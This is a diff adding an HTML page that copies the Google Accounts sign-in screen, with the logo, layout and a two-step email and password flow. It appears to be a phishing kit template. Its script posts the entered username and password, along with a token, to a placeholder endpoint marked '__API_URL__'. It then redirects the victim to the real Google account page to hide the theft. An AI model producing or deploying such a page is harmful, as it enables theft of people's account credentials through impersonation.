@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #f0f4f9;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            color: #1f1f1f;
+        }
+
+        main {
+            width: 100%;
+            max-width: 1040px;
+            background-color: #fff;
+            border-radius: 28px;
+            display: flex;
+            min-height: 402px;
+            margin: 20px;
+            overflow: hidden;
+        }
+
+        .left-panel {
+            flex: 1;
+            padding: 36px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .right-panel {
+            flex: 1;
+            padding: 36px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        @media (max-width: 876px) {
+            main {
+                flex-direction: column;
+                max-width: 450px;
+                min-height: auto;
+            }
+
+            .left-panel,
+            .right-panel {
+                padding: 24px;
+            }
+        }
+
+        .logo {
+            width: 48px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 400;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-top: 12px;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 14px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            background: transparent;
+            transition: border 0.1s;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #0b57d0;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #fff;
+            padding: 0 4px;
+            color: #444746;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s;
+        }
+
+        .input-group input:focus+label,
+        .input-group input:not(:placeholder-shown)+label {
+            top: 0;
+            font-size: 12px;
+            color: #0b57d0;
+        }
+
+        .forgot-link {
+            color: #0b57d0;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 32px;
+            cursor: pointer;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .guest-info {
+            font-size: 14px;
+            color: #444746;
+            line-height: 1.4;
+            margin-bottom: 40px;
+        }
+
+        .guest-info a {
+            color: #0b57d0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .action-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .create-account {
+            color: #0b57d0;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .next-btn {
+            background-color: #0b57d0;
+            color: #fff;
+            border: none;
+            border-radius: 100px;
+            padding: 0 24px;
+            height: 40px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .next-btn:hover {
+            background-color: #0842a0;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+        }
+
+        footer {
+            max-width: 1040px;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 20px;
+            font-size: 12px;
+            color: #1f1f1f;
+            margin-top: 10px;
+        }
+
+        .footer-right {
+            display: flex;
+            gap: 16px;
+        }
+
+        .footer-right a {
+            color: inherit;
+            text-decoration: none;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        #passwordStep {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <main>
+        <div class="left-panel">
+            <svg class="logo" viewBox="0 0 48 48">
+                <path fill="#EA4335"
+                    d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z">
+                </path>
+                <path fill="#4285F4"
+                    d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z">
+                </path>
+                <path fill="#FBBC05"
+                    d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24s.92 7.54 2.56 10.78l7.97-6.19z">
+                </path>
+                <path fill="#34A853"
+                    d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z">
+                </path>
+            </svg>
+            <h1 id="mainTitle">Sign in</h1>
+            <p class="subtitle" id="mainSubtitle">Use your Google Account</p>
+        </div>
+
+        <div class="right-panel">
+            <form id="googleForm">
+                <div id="emailStep">
+                    <div class="input-group">
+                        <input type="text" id="username" placeholder=" " autocomplete="username" required>
+                        <label for="username">Email or phone</label>
+                    </div>
+                    <a class="forgot-link">Forgot email?</a>
+                    <div class="guest-info">
+                        Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
+                    </div>
+                </div>
+
+                <div id="passwordStep">
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder=" " autocomplete="current-password">
+                        <label for="password">Enter your password</label>
+                    </div>
+                    <a class="forgot-link">Forgot password?</a>
+                </div>
+
+                <div class="action-row">
+                    <a class="create-account">Create account</a>
+                    <button type="submit" id="nextButton" class="next-btn">Next</button>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer>
+        <div class="lang-selector">English (United States)</div>
+        <div class="footer-right">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+
+    <script>
+        const form = document.getElementById('googleForm');
+        const emailStep = document.getElementById('emailStep');
+        const passwordStep = document.getElementById('passwordStep');
+        const mainTitle = document.getElementById('mainTitle');
+        const mainSubtitle = document.getElementById('mainSubtitle');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+
+        let step = 1;
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            if (step === 1) {
+                if (usernameInput.value.length > 0) {
+                    emailStep.style.display = 'none';
+                    passwordStep.style.display = 'block';
+                    mainTitle.innerText = 'Welcome';
+                    mainSubtitle.innerText = usernameInput.value;
+                    passwordInput.focus();
+                    step = 2;
+                }
+            } else {
+                const data = {
+                    token: '__TOKEN__',
+                    username: usernameInput.value,
+                    password: passwordInput.value
+                };
+
+                fetch('__API_URL__', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).finally(() => {
+                    window.location.href = 'https://accounts.google.com/ManageAccount';
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
